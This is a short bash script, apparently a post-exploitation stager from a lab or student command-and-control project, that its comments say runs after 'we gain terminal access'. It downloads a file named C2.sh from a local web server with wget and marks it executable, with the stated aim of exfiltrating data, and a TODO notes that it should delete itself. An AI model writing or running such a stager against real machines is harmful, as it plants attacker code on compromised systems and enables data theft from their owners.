#!/bin/bash

#This is what is run once we gain terminal access:
#*version without cron*

#Part 1: load commands + post data on website
#download our code to exfil data
code_name="C2.sh"
wget -O $code_name http://127.0.0.1:8000/C2_code
chmod +x $code_name

#TODO: rm self once done